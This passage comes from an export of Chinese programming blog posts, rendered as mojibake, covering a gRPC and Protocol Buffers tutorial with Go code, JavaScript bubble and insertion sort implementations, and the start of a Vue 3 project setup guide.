ä¹Ÿæ˜¯åŸºæ–¼é€™æ¨£çš„æ¦‚å¿µï¼Œè®“æƒ³è¦å‘¼å« server è™•ç†è«‹æ±‚çš„ clientï¼Œåœ¨ä½¿ç”¨é€™æ”¯ API æ™‚å°±å¥½åƒæ˜¯å‘¼å«è‡ªå·±å…§éƒ¨çš„å‡½å¼ä¸€æ¨£ç°¡å–®è‡ªç„¶ã€‚å¾åŠŸèƒ½é¢ä¾†èªªï¼ŒgRPC å°±åƒ Web å¸¸ç”¨çš„ Restful API ä¸€æ¨£ï¼Œéƒ½æ˜¯åœ¨è™•ç†è«‹æ±‚å’Œå›æ‡‰ï¼Œä¸¦ä¸”é€²è¡Œè³‡æ–™äº¤æ›ï¼Œä½† gRPC é‚„å¤šäº†å…¶ä»–çš„åŠŸèƒ½å’Œç‰¹è‰²ã€‚\ngRPC æ˜¯ç”± Google é–‹ç™¼çš„é–‹æºæ¡†æ¶ï¼Œå®ƒå¿«é€Ÿæœ‰æ•ˆã€å¥ åŸºåœ¨ HTTP/2 ä¸Šæä¾›ä½å»¶é²ï¼ˆlow latencyï¼‰ï¼Œæ”¯æ´ä¸²æµï¼Œæ›´å®¹æ˜“åšåˆ°æ¬Šé™é©—è­‰ï¼ˆauthenticationï¼‰ã€‚åœ¨ä¸‹é¢çš„æ–‡ç« ä¸­ï¼Œå°‡æœƒå°æ–¼ gRPC èƒ½æä¾›çš„ç‰¹è‰²æœ‰æ›´å¤šèªªæ˜ã€‚\nProtocol Buffers æ˜¯ä»€éº¼ Protocol Buffers @ Google Developer Protocol Buffers ç­†è¨˜ @ pjchender.dev åœ¨å­¸ç¿’ gRPC æ™‚ï¼Œéœ€è¦åŒæ™‚äº†è§£ä»€éº¼æ˜¯ Protocol Buffersã€‚åœ¨å‚³çµ±çš„ Restful API ä¸­ï¼Œæœ€å¸¸ä½¿ç”¨çš„è³‡æ–™äº¤æ›æ ¼å¼é€šå¸¸æ˜¯ JSONï¼›ä½†åˆ°äº† gRPC ä¸­ï¼Œè³‡æ–™äº¤æ›çš„æ ¼å¼å‰‡æ˜¯ä½¿ç”¨åç‚º Protocol Buffers çš„è¦ç¯„ï¼èªè¨€ã€‚\njson 1 2 3 4 5 { \u0026#34;firstName\u0026#34;: \u0026#34;Sushiro\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;age\u0026#34;: 6 } protocol buffers 1 2 3 4 5 6 // Protocol Buffers message User { string first_name = 1; string last_name = 2; int32 age = 3; } ä¹Ÿå°±æ˜¯èªªï¼Œç•¶æˆ‘å€‘æƒ³è¦ä½¿ç”¨ gRPC çš„æœå‹™ä¾†äº¤æ›è³‡æ–™å‰ï¼Œå¿…é ˆå…ˆæŠŠè³‡æ–™ã€Œæ ¼å¼ã€å’Œã€Œæ–¹æ³•ã€éƒ½å®šç¾©æ¸…æ¥šã€‚\nTIP:\nä½¿ç”¨ gRPC å‰ï¼Œä¸åªéœ€è¦å…ˆæŠŠè³‡æ–™äº¤æ›çš„æ ¼å¼å®šç¾©æ¸…æ¥šï¼ŒåŒæ™‚ä¹Ÿéœ€è¦æŠŠè³‡æ–™äº¤æ›çš„æ–¹æ³•å®šç¾©æ¸…æ¥šã€‚\né€™è£¡è¦ç¨å¾®é‡æ¸…ä¸€é»å¾ˆé‡è¦çš„æ˜¯ï¼ŒProtocol Buffers å¯ä»¥ç¨ç«‹ä½¿ç”¨ï¼Œä¸ä¸€å®šè¦æ­é… gRPCï¼›ä½†ä½¿ç”¨ gRPC ä¸€å®šè¦æ­é… Protocol Buffersã€‚\nå¯¦ä½œå°‡ Protocol Buffers ç·¨è­¯æˆåœ¨ Golang ä¸­å¯ä½¿ç”¨çš„æª”æ¡ˆ å°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ proto è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šæ’°å¯« Protocol Buffers æª”æ¡ˆ ä½¿ç”¨ message å®šç¾©è³‡æ–™äº¤æ›çš„æ ¼å¼ã€‚ ä½¿ç”¨ service å®šç¾©å‘¼å« API çš„æ–¹æ³•åç¨±ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 syntax = \u0026#34;proto3\u0026#34;; // å®šç¾©è¦ä½¿ç”¨çš„ protocol buffer ç‰ˆæœ¬ package calculator; // for name space option go_package = \u0026#34;proto/calculator\u0026#34;; // generated code çš„ full Go import path message CalculatorRequest { int64 a = 1; int64 b = 2; } message CalculatorResponse { int64 result = 1; } service CalculatorService { rpc Sum(CalculatorRequest) returns (CalculatorResponse) {}; } STEP 2ï¼šå®‰è£ç·¨è­¯ Protocol Buffer æ‰€éœ€çš„å¥—ä»¶ æ­¤éƒ¨ä»½å¯åƒè€ƒ ç·¨è­¯ Protocol Buffersï¼ˆCompilingï¼‰ æ®µè½ã€‚\nå®‰è£ compiler (macOS) 1 2 3 4 5 6 7 8 9 10 11 # å®‰è£ compilerï¼Œå®‰è£å®Œå¾Œå°±æœƒæœ‰ protoc CLI å·¥å…· brew install protobuf protoc --version # Ensure compiler version is 3+ # --- ä½¿ç”¨ golang æ‰éœ€è¦å®‰è£ä»¥ä¸‹å…©å€‹å¥—ä»¶ --- # å®‰è£ protoc-gen-go å¾Œå¯ä»¥å°‡ proto buffer ç·¨è­¯æˆ Golang å¯ä½¿ç”¨çš„æª”æ¡ˆ go get github.com/golang/protobuf/protoc-gen-go # å®‰è£ grpc-go å¾Œï¼Œå¯ä»¥åœ¨ Golang ä¸­ä½¿ç”¨ gRPC go get -u google.golang.org/grpc STEP 3ï¼šç·¨è­¯ Protocol Buffer æª”æ¡ˆ é€²åˆ°æ”¾æœ‰ .proto æª”çš„è³‡æ–™å¤¾å¾Œï¼Œåœ¨çµ‚ç«¯æ©Ÿè¼¸å…¥ä¸‹è¿°æŒ‡ä»¤ï¼š\n1 protoc *.proto --go_out=plugins=grpc:. --go_opt=paths=source_relative åœ¨æˆåŠŸç·¨è­¯å¥½å¾Œï¼Œæ‡‰è©²æœƒçœ‹åˆ°åŒæ¨£çš„è³‡æ–™å¤¾ä½ç½®å‡ºç¾ *.pb.go çš„æª”æ¡ˆï¼Œé€™å°±æ˜¯ç·¨è­¯å¥½å¾Œå¯ä»¥åœ¨ Golang ä¸­ä½¿ç”¨ Protocol Buffer å’Œ gRPC çš„æª”æ¡ˆã€‚\nå¯¦ä½œ gRPC Server å°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ server è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šå»ºç«‹ gRPC server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type Server struct {} func main() { fmt.Println(\u0026#34;starting gRPC server...\u0026#34;) lis, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:50051\u0026#34;) if err != nil { log.Fatalf(\u0026#34;failed to listen: %v \\n\u0026#34;, err) } grpcServer := grpc.NewServer() calculatorPB.RegisterCalculatorServiceServer(grpcServer, \u0026amp;Server{}) if err := grpcServer.Serve(lis); err != nil { log.Fatalf(\u0026#34;failed to serve: %v \\n\u0026#34;, err) } } STEP 2ï¼šå¯¦ä½œ Protocol Buffer ä¸­çš„ service 1 2 3 4 5 6 7 8 9 10 11 12 func (*Server) Sum(ctx context.Context, req *calculatorPB.CalculatorRequest) (*calculatorPB.CalculatorResponse, error) { fmt.Printf(\u0026#34;Sum function is invoked with %v \\n\u0026#34;, req) a := req.GetA() b := req.GetB() res := \u0026amp;calculatorPB.CalculatorResponse{ Result: a + b, } return res, nil } STEP 3ï¼šå•Ÿå‹• server åœ¨çµ‚ç«¯æ©Ÿä¸­è¼¸å…¥ï¼š\n1 go run server/server.go å³å¯å•Ÿå‹• gRPC serverã€‚\nè£œå……ï¼šä½¿ç”¨ Bloom RPC é€²è¡Œæ¸¬è©¦ åœ¨åªæœ‰ server çš„æƒ…æ³ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ BloomRPC é€™å¥—å·¥å…·ä¾†æ¨¡æ“¬ Client å° gRPC server ç™¼é€è«‹æ±‚ï¼ŒåŠŸèƒ½å°±é¡ä¼¼åœ¨ Restful ä¸­ä½¿ç”¨çš„ Postmanã€‚\nä½¿ç”¨æ™‚åªéœ€è¦åŒ¯å…¥ proto æª”å¾Œï¼Œå³å¯çœ‹åˆ°å°æ‡‰å¯å‘¼å«çš„æ–¹æ³•å’Œå¯å¸¶å…¥çš„åƒæ•¸ï¼Œèƒ½é€™éº¼æ–¹ä¾¿ä¹Ÿæ˜¯å› ç‚ºåœ¨ protocol buffer ä¸­å·²ç¶“æŠŠå‚³è¼¸çš„è³‡æ–™æ ¼å¼å’Œèƒ½å°æ‡‰å‘¼å«çš„æ–¹æ³•éƒ½å®šå¥½çš„ç·£æ•…ã€‚\nå¯¦ä½œ gRPC Client å®Œæ•´ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ client è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šèˆ‡ gRPC server å»ºç«‹é€£ç·š 1 2 3 4 5 6 7 8 9 10 11 12 func main() { conn, err := grpc.Dial(\u0026#34;localhost:50051\u0026#34;, grpc.WithInsecure()) if err != nil { log.Fatalf(\u0026#34;failed to dial: %v\u0026#34;, err) } defer conn.Close() client := calculatorPB.NewCalculatorServiceClient(conn) doUnary(client) } STEP 2ï¼šä½¿ç”¨ Protocol Buffers ä¸­å®šç¾©å¥½çš„ Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func doUnary(client calculatorPB.CalculatorServiceClient) { fmt.Println(\u0026#34;Staring to do a Unary RPC\u0026#34;) req := \u0026amp;calculatorPB.CalculatorRequest{ A: 3, B: 10, } res, err := client.Sum(context.Background(), req) if err != nil { log.Fatalf(\u0026#34;error while calling CalculatorService: %v \\n\u0026#34;, err) } log.Printf(\u0026#34;Response from CalculatorService: %v\u0026#34;, res.Result) } STEP 3ï¼šå‘ server ç™¼é€è«‹æ±‚ åœ¨çµ‚ç«¯æ©Ÿä¸­è¼¸å…¥ï¼š\n1 go run client/client.go å³å¯åŸ·è¡Œ client.go ä¸¦å‘å‰›å‰›èµ·å‹•å¥½çš„ server ç™¼é€è«‹æ±‚ã€‚\ngRPC è§£æ±ºäº†ä»€éº¼ gRPC å’Œ REST API çš„æ¯”è¼ƒ æ¯”è¼ƒ gRPC æœå‹™èˆ‡ HTTP API @ microsoft docs\nç°¡å–®ä¾†èªªï¼ŒgRPC åœ¨æ•ˆèƒ½ä¸Šæ¯”èµ· REST API å¥½éå¸¸å¤šï¼š\né …ç›® gRPC Restful API è³‡æ–™å‚³è¼¸æ ¼å¼ï¼ˆPayloadï¼‰ Protocol Buffer - æ›´å¿«ä¸”æ›´å° JSON, XML, formData - è¼ƒæ…¢ä¸”è¼ƒå¤§ é€šè¨Šå”å®š HTTP/2 HTTP å‚³è¼¸æ–¹å¼ æ”¯æ´ä¸€èˆ¬çš„ã€Œè«‹æ±‚-å›æ‡‰ã€ã€ä¼ºæœå™¨ç«¯ä¸²æµã€Client ç«¯ä¸²æµã€èˆ‡é›™å‘ä¸²æµï¼ˆstreamingï¼‰ åƒ…èƒ½é€é Client ç™¼é€è«‹æ±‚ã€Server çµ¦äºˆå›æ‡‰ API æ–¹æ³•å‘½å æ²’æœ‰é™åˆ¶ï¼Œä¸€èˆ¬æœƒç›´æ¥æè¿°è©²æ–¹æ³•è¦åšçš„äº‹ï¼Œä¾‹å¦‚ createUser, getUserã€‚ä¸éœ€è¦æ€è€ƒè·¯ç”±å‘½åã€‚ ä½¿ç”¨å‹•è©ï¼ˆGET, POST, PUT, PATCH, DELETEï¼‰æ­é…è³‡æºä¾†å‘½åã€‚éœ€è¦æ ¹æ“šä¸åŒçš„è¡Œç‚ºä¾†å®šç¾©ä¸åŒçš„è·¯ç”±ã€‚ Client å‘¼å« API çš„æ–¹å¼ å°±åƒå‘¼å«ä¸€èˆ¬çš„å‡½å¼ é€éç‰¹å®šçš„ Endpointï¼Œçµ¦äºˆç¬¦åˆçš„è³‡æ–™å‹åˆ¥ Server å»ºç«‹ API çš„æ–¹å¼ æ ¹æ“šæ–‡ä»¶ï¼ˆProtocol Bufferï¼‰å¯¦ä½œåŠŸèƒ½ï¼Œä¸éœ€è¦é¡å¤–æª¢æŸ¥è³‡æ–™å‹åˆ¥èˆ‡æ–¹æ³•æ­£ç¢ºæ€§ã€‚ æ ¹æ“šæ–‡ä»¶ï¼ˆSwaggerï¼‰å¯¦ä½œåŠŸèƒ½ï¼Œä½†é ˆé¡å¤–æª¢æŸ¥è³‡æ–™å‹åˆ¥ã€‚ æ ¹æ“šæ–‡ä»¶ç”¢ç”Ÿç¨‹å¼ç¢¼ Protocol Buffers OpenAPI / Swagger æ­¤å¤–ï¼ŒgRPC çš„ serverï¼Œé è¨­å°±æ˜¯éåŒæ­¥çš„ï¼Œå› æ­¤ä¸æœƒé˜»å¡ä»»ä½•é€²ä¾†çš„è«‹æ±‚ï¼Œä¸¦å¯ä»¥å¹³è¡Œè™•ç†å¤šå€‹è«‹æ±‚ã€‚gRPC Client å‰‡å¯ä»¥é¸æ“‡è¦ç”¨åŒæ­¥ï¼ˆé˜»å¡ï¼‰æˆ–éåŒæ­¥çš„æ–¹å¼è™•ç†ã€‚\nä½¿ç”¨ Protocol Buffers çš„å¥½è™• ç¯€çœç¶²è·¯å‚³è¼¸é‡ï¼šé€Ÿåº¦æ›´å¿«ã€æª”æ¡ˆæ›´å° ç¯€çœ CPU æ¶ˆè€—ï¼šParse JSON æœ¬èº«æ˜¯ CPU intensive çš„ä»»å‹™ï¼›Parse Protocol Bufferï¼ˆbinary formatï¼‰å› ç‚ºæ›´æ¥è¿‘åº•å±¤æ©Ÿå™¨è¡¨å¾µè³‡æ–™çš„æ–¹å¼ï¼Œæ¶ˆè€—çš„ CPU è³‡æºè¼ƒä½ è·¨ç¨‹å¼èªè¨€ï¼šProtocol Buffer å¯ä»¥æ ¹æ“šä¸åŒçš„ç¨‹å¼èªè¨€ç·¨è­¯å‡ºä¸åŒçš„æª”æ¡ˆ å¯ä»¥å¯«è¨»è§£ã€å‹åˆ¥æ¸…æ¥šæ˜ç¢º TIP\nç¯€çœç¶²è·¯å‚³è¼¸é‡å’Œ CPU æ¶ˆè€—åœ¨è¡Œå‹•è£ç½®ä¸Šçš„å½±éŸ¿å¯èƒ½æ›´é‡è¦ã€‚\nè·¨ç¨‹å¼èªè¨€çš„å¥½è™• é€é Protocol Buffer å®šç¾©å¥½è³‡æ–™çš„å‚³è¼¸æ¬„ä½ï¼ˆmessageï¼‰å’Œå‘¼å«çš„æ–¹æ³•ï¼ˆserviceï¼‰å¾Œï¼ŒgRPC å³å¯åœ¨ä¸åŒç¨‹å¼èªè¨€ä¸Šé‹è¡Œï¼Œé€™éå¸¸é©åˆå¾®æœå‹™ï¼ˆmicro-servicesï¼‰çš„æ‡‰ç”¨æƒ…å¢ƒï¼Œåªè¦é›™æ–¹ä¸€èµ·å®šç¾©å¥½ schema å¾Œï¼Œå°±å¯ä»¥ç”¨ä¸åŒçš„ç¨‹å¼èªè¨€é€²è¡Œé–‹ç™¼ã€‚\nä½¿ç”¨ HTTP/2 çš„å¥½è™• HTTP/2 vs HTTP/1 - Performance Comparison? Demoï¼šPerformance difference between HTTP2 and HTTP1.1 ç€è¦½å™¨å…è¨±çš„ä½µç™¼è«‹æ±‚è³‡æºæ•¸æ˜¯æœ‰é™åˆ¶çš„-åˆ†æ @ ITRead01 å‚³çµ±çš„ HTTP/1.1 åœ¨æ¯å€‹ TCP é€£ç·šä¸­åªå…è¨±å‘ server ç™¼é€å–®ä¸€å€‹è«‹æ±‚ï¼Œä½†ç•¶ç¶²é è¼‰å…¥æ™‚ï¼Œå¾€å¾€æœƒéœ€è¦å‘åŒä¸€å€‹ä¼ºæœå™¨ç™¼é€å¤šå€‹è«‹æ±‚ï¼ˆä¾‹å¦‚ã€åœ–æª”ã€CSSã€éœæ…‹æª”ã€JS ç­‰ï¼‰ï¼Œå› æ­¤ç‚ºäº†è¦é¿é–‹é€™æ¨£çš„é™åˆ¶ã€åŠ å¿«è¼‰å…¥çš„é€Ÿåº¦ï¼Œç€è¦½å™¨æœƒå¯¦ä½œå¤šå€‹å¹³è¡Œçš„ï¼ˆparallelï¼‰ TPC é€£ç·šï¼ˆæ¯å€‹ç€è¦½å™¨å¯¦ä½œä¸åŒï¼Œå› æ­¤æ•¸é‡çš„ä¸Šé™ä¹Ÿä¸åŒï¼‰ï¼Œä»¥è™•ç†åŒæ™‚å‘ä¼ºæœå™¨ç™¼å‡ºçš„å¤šå€‹è«‹æ±‚ã€‚\nåœ¨ HTTP/2 ä¸­å‰‡å¯åœ¨åŒä¸€å€‹ TCP é€£ç·šä¸­é€²è¡Œå¤šå€‹è«‹æ±‚å’Œå›æ‡‰ï¼Œä¸¦ä¸”å¯ä»¥ç”± server ä¸»å‹•æ¨é€è³‡æºçµ¦ clientï¼Œè€Œä¸¦éä¸€å®šè¦é€é client ä¸»å‹•è«‹æ±‚ï¼›æ­¤å¤–æ”¯æ´ HTTP Header çš„å£“ç¸®ï¼Œæ¸›å°‘è³‡æ–™å‚³æ•¸é‡ï¼›HTTP/2 ä¹Ÿæ˜¯ä½¿ç”¨ binary çš„æ–¹å¼åœ¨å‚³è¼¸è³‡æ–™ã€‚\ngRPC çš„å››ç¨®é¡å‹ Unaryï¼šé¡ä¼¼å‚³çµ± APIï¼Œclient ç™¼é€ request è€Œ server å›å‚³ response Server Streamingï¼šé€é HTTP/2ï¼Œclient ç™¼é€ä¸€æ¬¡ requestï¼Œè€Œ server å¯ä»¥å›å‚³å¤šæ¬¡è³‡æ–™ Client Streamingï¼šclient ç™¼é€å¤šæ¬¡è³‡æ–™ï¼Œç›´åˆ°å‘ŠçŸ¥ server è³‡æ–™å‚³å®Œå¾Œï¼Œserver å†çµ¦äºˆ response Bi Directional Streamingï¼šå…©é‚Šéƒ½ç”¨ä¸²æµçš„æ–¹å¼å‚³é€è³‡æ–™ åœ–ç‰‡ä¾†æºï¼šgRPC Golang - Master Class: Build Modern API \u0026amp; MicroServices @ Udemy\n1 2 3 4 5 6 7 8 9 10 11 12 13 service GreetService { // Unary rpc Greet(GreetRequest) returns (GreetResponse) {}; // Streaming Server rpc GreetManyTimes(GreetManyTimesRequest) returns (stream GreetManyTimesResponse) {}; // Streaming Client rpc LongGreet(stream LongGreetRequest) returns (LongGreetResponse) {}; // Bi-directional Streaming rpc GreetEveryone(stream GreetEveryoneRequest) returns (stream GreetEveryoneResponse) {}; } gRPC çš„ç¼ºé» Protocol Buffer ä¸åƒ JSON æ˜¯ Human Readableã€‚ éœ€è¦é¡å¤–çš„å­¸ç¿’æ™‚é–“å’Œå°å…¥æˆæœ¬ã€‚ ç€è¦½å™¨åŸç”Ÿç›®å‰é‚„ä¸æ”¯æ´ï¼Œé ˆé€éå¥—ä»¶ grpc-web ä¾†è™•ç†ã€‚ å…¶ä»– æ¨è–¦å·¥å…· BloomRPCï¼šæ–¹ä¾¿ç”¨ä¾†æ¨¡æ“¬ Client å° gRPC server ç™¼é€è«‹æ±‚ï¼ŒåŠŸèƒ½å°±é¡ä¼¼åœ¨ Restful ä¸­ä½¿ç”¨çš„ Postmanã€‚ éŒ¯èª¤æ’é™¤ protoc-gen-go: program not found or is not executable\n1 2 # éœ€è¦æŠŠ $GOPATH/bin åŠ åˆ° .zshrc/.bashrc ç­‰ $ echo \u0026#39;export PATH=$PATH:$GOPATH/bin\u0026#39; \u0026gt;\u0026gt; $HOME/.zshrc åƒè€ƒè³‡æ–™ Go Tutorial @ gRPC.io Introduction to gRPC @ gRPC.io Protocol Buffers @ Google Developer gRPC - Golang Master Class: Build Modern API \u0026amp; MicroServices @ Udemy æ¯”è¼ƒ gRPC æœå‹™èˆ‡ HTTP API @ Microsoft Docs ","date":"2022-07-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52276040314_2afa0e7026_o.png","permalink":"https://wayneblog.ga/2022-07-22/grpc-basic-introduction/","title":"gRPC åŸºæœ¬ä»‹ç´¹"},{"content":" åƒè€ƒç¶²ç«™ - JavaScript è³‡æ–™çµæ§‹èˆ‡æ¼”ç®—æ³•ï¼šæ°£æ³¡æ’åº Bubble Sortã€æ’å…¥æ’åº Insertion Sort å¯¦ä½œèˆ‡åˆ†æ - å½­å½­ç›´æ’­\næ’åºæ¼”ç®—æ³• æ°£æ³¡æ’åºæ³•(bubble sort) æ¦‚è¦ ä½¿ç”¨é›™å±¤è¿´åœˆï¼Œç”±å¾Œå¾€å‰ã€‚ æ¯è¼ªå›ºå®šæœ€å³é‚Šçš„å€¼ï¼Œæ¥è‘—å€†å€†æ¯”è¼ƒå¤§å°ï¼Œå°‡å¤§çš„æ”¾å³é‚Šã€‚ ä¸‹è¼ªå‰‡ - 1ã€‚ å®Œç•¢å¾Œå³å¯æ’åºå®Œç•¢ã€‚ åŸ·è¡Œçš„ç¸½è¼ªæ•¸ç‚ºé™£åˆ—é•·åº¦ - 1ã€‚ æ™‚é–“è¤‡é›œåº¦ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 4ï¼Œè¦æ¯”å° 3+2+1 ç¸½å…± 6 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 7ï¼Œè¦æ¯”å° 6+5+\u0026hellip;+1 ç¸½å…± 21 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ nï¼Œè¦æ¯”å° (n-1)+(n-2)+\u0026hellip;+1 ç¸½å…±\n(n * (n - 1)) / 2 = nÂ²/2 - n/2 æ¬¡ æœå°‹æ‰€éœ€æ™‚é–“éš¨è‘—é™£åˆ—çš„é•·åº¦\nå‘ˆå¹³æ–¹æˆé•· O(NÂ²)ã€‚ å‡è¨­ å¯ä»¥åŠ å…¥ä¸€å€‹ flag ä¾†åšåˆ¤å®šï¼Œå‡è¨­æ¯”è¼ƒå®Œç¬¬ä¸€è¼ªç™¼ç¾æ²’æœ‰äº¤æ›çš„æƒ…æ³ç™¼ç”Ÿï¼Œå‰‡ä»£è¡¨å·²ç¶“æ’åºå®Œæˆï¼Œä¸éœ€è¦å†è·‘ä¸‹ä¸€è¼ªï¼Œå³å¯ç¨å¾®å„ªåŒ–æ’åºã€‚ å¯¦ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // å¯¦ä½œæ°£æ³¡æ’åºæ¼”ç®—æ³• function bubbleSort(arr){ // arr æ˜¯ä¸€å€‹æ•¸å­—é™£åˆ— for(let i=arr.length-1;i\u0026gt;=1;i--){ let swap=false; // å‡è¨­æ²’æœ‰äº¤æ›ç™¼ç”Ÿ for(let j=0;j\u0026lt;i;j++){ if(arr[j]\u0026gt;arr[j+1]){ // å¦‚æœé †åºä¸å°ï¼Œäº¤æ› let temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; swap=true; // ç´€éŒ„ç™¼ç”Ÿäº¤æ› } } if(!swap){ // ç™¼ç¾ä¸€æ•´è¼ªä¸­éƒ½æ²’æœ‰äº¤æ›ç™¼ç”Ÿï¼Œç›´æ¥åˆ¤å®šæ’åºå®Œæˆ break; } } } let data = [1, 6, 3, 4]; console.log(bubbleSort(data)); è¼¸å‡ºï¼š 1 \u0026gt; [1, 3, 4, 6] æ’å…¥æ’åºæ³•(insertion sort) æ¦‚è¦ ä½¿ç”¨é›™å±¤è¿´åœˆï¼Œç”±å‰å¾€å¾Œã€‚ å¾ç¬¬äºŒç­†é–‹å§‹ï¼Œæ¯è¼ªå°‡è©²ç­†è³‡æ–™å¾€å‰æ¯”è¼ƒå¤§å°ï¼Œå°‡å¤§çš„æ”¾å³é‚Šï¼šæ¯è¼ªæ¯”è¼ƒå¾ (i - 1) ~ 0ã€‚ ä¸‹è¼ªå‰‡ + 1ã€‚ å®Œç•¢å¾Œå³å¯æ’åºå®Œç•¢ã€‚ åŸ·è¡Œçš„ç¸½è¼ªæ•¸ç‚ºé™£åˆ—é•·åº¦ - 1ã€‚ æ™‚é–“è¤‡é›œåº¦(è¤‡é›œåº¦åŒæ°£æ³¡æ’åºæ³•) å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 4ï¼Œè¦æ¯”å° 1+2+3 ç¸½å…± 6 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 7ï¼Œè¦æ¯”å° 1+2+\u0026hellip;+6 ç¸½å…± 21 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ nï¼Œè¦æ¯”å° 1+2+\u0026hellip;+(n-1) ç¸½å…±\n(n * (n - 1)) / 2 = nÂ²/2 - n/2 æ¬¡ æœå°‹æ‰€éœ€æ™‚é–“éš¨è‘—é™£åˆ—çš„é•·åº¦\nå‘ˆå¹³æ–¹æˆé•· O(NÂ²)ã€‚ å‡è¨­ å‡è¨­ç•¶å‰æ¯”å°çš„å€¼èˆ‡ç¬¬ä¸€å€‹è¦æ¯”è¼ƒçš„å€¼ä¸€æ¯”è¼ƒï¼Œæ°å¥½æ­£ç¢ºï¼Œå‰‡ä»£è¡¨å‰é¢çš†å·²ç¶“æ’åºå®Œæˆï¼Œå¯ä»¥é€²åˆ°ä¸‹ä¸€è¼ªã€‚ å¯¦ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // å¯¦ä½œæ’å…¥æ’åºæ¼”ç®—æ³• function insertionSort(arr){ // arr æ˜¯ä¸€å€‹æ•¸å­—é™£åˆ— for(let i=1;i\u0026lt;arr.length;i++){ for(let j=i-1;j\u0026gt;=0;j--){ if(arr[j]\u0026gt;arr[j+1]){ // å¦‚æœé †åºä¸å°ï¼Œäº¤æ› [arr[j], arr[j+1]]=[arr[j+1], arr[j]]; // javascript äº¤æ›çš„èªæ³•ç³– }else{ // ä»»ä½•ä¸€æ¬¡æ¯”è¼ƒï¼Œç™¼ç¾é †åºå°äº†ï¼Œé€™ä¸€è¼ªå°±ä¸ç”¨ç¹¼çºŒäº† break; } } } } let data = [1, 6, 3, 4]; console.log(insertionSort(data)); è¼¸å‡ºï¼š 1 \u0026gt; [1, 3, 4, 6] å¤§å‹è³‡æ–™é‡çš„é€²éšæ¢è¨ O(NÂ²)ï¼š(è®€ä½œ big-O Nå¹³æ–¹) æ˜¯ç›¸ç•¶å¯æ€•çš„ï¼Œæ’åºçš„åŸ·è¡Œæ™‚é–“å°‡æœƒæ˜¯è³‡æ–™é‡çš„å¹³æ–¹å€æ•¸æˆé•·ã€‚\næ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // ç”¢ç”Ÿéš¨æ©Ÿè³‡æ–™ let data=[]; for(let i=0;i\u0026lt;100000;i++){ data.push(Math.random()*1000000); } // è³‡æ–™é‡æ˜¯ 100,000ï¼Œæˆ‘çš„æ¼”ç®—æ³•æ™‚é–“è¤‡é›œåº¦æ˜¯ O(N^2)ï¼Œé æœŸè¦èŠ± 100,000^2 = 10,000,000,000 æ¬¡çš„æ¯”è¼ƒé‹ç®— // æˆ‘å€‘çš„é›»è…¦ä¸€ç§’é˜è·‘ 10 å„„å€‹æŒ‡ä»¤(ç²—ç•¥é ä¼° 1 GB) console.time(); // æ’å…¥æ’åºæ³•ï¼Œå¤§ç´„è·‘äº†10å¹¾ç§’ //insertionSort(data); // ä½¿ç”¨ JavaScript å…§å»ºçš„æ’åºåŠŸèƒ½ sort()ï¼Œå¤§ç´„è·‘äº† 0.2 ~ 0.3 ç§’ // å¾ˆæœ‰æ©Ÿæœƒæ˜¯ä½¿ç”¨å¿«é€Ÿæ’åº Quick Sort(å¿«é€Ÿæ’åºæ³•) æˆ–å…¶è®Šå½¢ data.sort(); console.timeEnd(); ","date":"2022-07-21T00:00:00Z","image":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/hqdefault_huc19c1d5e8083f3ca093a0303b2a8247b_19175_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/","title":"å½­å½­çš„èª²ç¨‹ - æ°£æ³¡æ’åºã€æ’å…¥æ’åºçš„å¯¦ä½œèˆ‡åˆ†æ"},{"content":" åƒè€ƒç¶²ç«™ - å°šç¡…è°·Vue3æŠ€è¡“\nå‰µå»º Vue 3.0 å·¥ç¨‹ ä½¿ç”¨ vue cli å‰µå»º å®˜æ–¹æ–‡æª”ï¼šhttps://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create 1 2 3 4 5 6 7 8 9 10 11 12 ## æŸ¥çœ‹ @vue/cli ç‰ˆæœ¬ï¼Œç¢ºä¿ @vue/cli ç‰ˆæœ¬åœ¨ 4.5.0 ä»¥ä¸Š vue --version ## å®‰è£æˆ–å‡ç´šä½ çš„ @vue/cli npm install -g @vue/cli ## å‰µå»º vue create vue_test ## å•Ÿå‹• cd vue_test npm run serve ä½¿ç”¨ vite å‰µå»º(Vueä½œè€…çš„åœ˜éšŠé–‹ç™¼) å®˜æ–¹æ–‡æª”ï¼šhttps://v3.cn.vuejs.org/guide/installation.html#vite viteå®˜ç¶²ï¼šhttps://vitejs.cn/ å„ªå‹¢ï¼š é–‹ç™¼ç’°å¢ƒä¸­ï¼Œç„¡éœ€æ‰“åŒ…æ“ä½œï¼Œå¯å¿«é€Ÿçš„å†·å•Ÿå‹•ã€‚ è¼•é‡å¿«é€Ÿçš„ç†±é‡è¼‰(HMR)ã€‚ çœŸæ­£çš„æŒ‰éœ€ç·¨è­¯ï¼Œä¸å†ç­‰å¾…æ•´å€‹æ‡‰ç”¨ç·¨è­¯å®Œæˆã€‚ 